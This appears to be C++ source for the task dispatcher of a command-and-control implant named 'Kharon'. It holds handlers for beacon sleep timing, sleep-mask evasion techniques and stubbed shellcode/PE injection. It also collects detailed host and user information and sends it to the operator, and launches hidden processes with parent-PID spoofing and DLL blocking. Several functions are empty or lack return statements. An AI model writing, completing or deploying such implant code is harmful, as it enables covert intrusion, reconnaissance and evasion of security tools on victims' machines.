#include <Kharon.h>

using namespace Root;

auto DECLFN Task::Dispatcher(
    VOID
) -> VOID {
    return;
}

auto DECLFN Task::SleepTime(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    ULONG NewSleepTime = Parser::GetInt32( Parser );
    
    Kharon::Session.SleepTime = NewSleepTime;

    KhDbg( "sleep time set to %d\n", Kharon::Session.SleepTime );

    return KhRetSuccess;
}

auto DECLFN Task::Injection(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    PPACKAGE Package = Package::Create( TskInjection );
    UINT8    TypeInj = Parser::GetByte( Parser );

    if ( TypeInj == SbInjShellcode ) {
        // return Injection::Sc(  );
    } else if ( TypeInj == SbInjPE ) {
        // return Injection::Pe(  );
    }

    return KhRetError( KH_ERROR_INVALID_INJECTION_ID );
}

auto DECLFN Task::SleepMask(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    PPACKAGE Package  = Package::Create( TskSleepMask );
    UINT8 TechniqueID = Parser::GetByte( Parser );
    if ( !TechniqueID ) {
        KhDbg( "invalid mask id" );
        return KH_ERROR_INVALID_MASK_ID;
    }

    Mask.TechniqueID = TechniqueID;

    KhDbg( 
        "mask technique id set to %d (%s)", Mask.TechniqueID, 
          Mask.TechniqueID == MaskTimer ? "timer" : 
        ( Mask.TechniqueID == MaskApc   ? "apc" : 
        ( Mask.TechniqueID == MaskWait  ? "wait" : "unknown" ) )
    );

    Package::Transmit( Package, 0, 0 );

    return KhRetSuccess;
}

auto DECLFN Task::FileSystem(
    _In_ PPARSER Parser
) -> ERROR_CODE {

}

auto DECLFN Task::SelfDelete(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    
}

auto DECLFN Task::GetInfo(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    PPACKAGE Package = Package::Create( TskGetInfo );

    Package::AddString( Package, Session.AgentID     );
    Package::AddInt32(  Package, Session.Base.Start  );
    Package::AddInt32(  Package, Session.Base.Length );
    Package::AddString( Package, Session.ImageName   );
    Package::AddString( Package, Session.ImagePath   );
    Package::AddString( Package, Session.CommandLine );
    Package::AddInt32(  Package, Session.ProcessID   );
    Package::AddInt32(  Package, Session.ThreadID    );
    Package::AddInt32(  Package, Session.ParentID    );
    Package::AddInt32(  Package, Session.HeapHandle  );
    Package::AddInt32(  Package, Session.SleepTime   );
    Package::AddInt32(  Package, Session.ProcessArch );
    Package::AddByte(   Package, Session.Elevated    );

    Package::AddByte(   Package, Mask.TechniqueID      );
    Package::AddByte(   Package, Mask.Heap             );
    Package::AddInt32(  Package, Mask.JmpGadget        );
    Package::AddInt32(  Package, Mask.NtContinueGadget );

    Package::AddString( Package, Machine.UserName      );
    Package::AddString( Package, Machine.CompName      );
    Package::AddString( Package, Machine.DomName       );
    Package::AddString( Package, Machine.NetBios       );
    Package::AddInt32(  Package, Machine.OsArch        );
    Package::AddInt32(  Package, Machine.OsMjrV        );
    Package::AddInt32(  Package, Machine.OsMnrV        );
    Package::AddInt32(  Package, Machine.OsBuild       );
    Package::AddInt32(  Package, Machine.ProductType   );
    Package::AddInt32(  Package, Machine.TotalRAM      );
    Package::AddInt32(  Package, Machine.AvalRAM       );
    Package::AddInt32(  Package, Machine.UsedRAM       );
    Package::AddInt32(  Package, Machine.PercentRAM    );
    Package::AddString( Package, Machine.ProcessorName );
    Package::AddInt32(  Package, Machine.ProcessorsNbr );
    
    Package::Transmit( Package, 0, 0 );

    KhRetSuccess;
}

auto DECLFN Task::Process(
    _In_ PPARSER Parser
) -> ERROR_CODE {
    PPACKAGE Package     = Package::Create( TskProcess );
    ULONG    SbCommandID = Parser::GetInt32( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    switch ( SbCommandID ) {
    case SbPsCreate: {
        PCHAR               CommandLine = Parser::GetStr( Parser, &TmpVal );
        PROCESS_INFORMATION PsInfo      = { 0 };
        Success = Process::Create( Package, CommandLine, CREATE_NO_WINDOW, &PsInfo );
        if ( !Success ) return KhGetError();

        Package::AddInt32( Package, PsInfo.dwProcessId );
        Package::AddInt32( Package, PsInfo.dwThreadId  );
        
        break;
    }
    case SbPsPpid: {
        ULONG ParentID = Parser::GetInt32( Parser );
        Ps.ParentID = ParentID;

        KhDbg( "parent ID set to %d\n", Ps.ParentID ); break;
    }
    case SbPsBlockDlls: {
        BOOL BlockDlls  = Parser::GetByte( Parser );
        Ps.BlockDlls = BlockDlls;
        
        KhDbg( "block non microsoft dlls is %s\n", Ps.BlockDlls ? "enabled" : "disabled" );

        break;
    }
    case SbPsList: {
        break;
    }
    case SbPsCurDir: {
        if ( Ps.CurrentDir ) {
            Heap().Free( Ps.CurrentDir, Str::LengthA( Ps.CurrentDir ) );
        }

        PCHAR CurDirTmp  = Parser::GetStr( Parser, &TmpVal );
        PCHAR CurrentDir = A_PTR( Heap().Alloc( TmpVal ) );

        Mem::Copy( CurrentDir, CurDirTmp, TmpVal );

        Ps.CurrentDir = CurrentDir; break;
    }

        KhRetSuccess;
    } 
}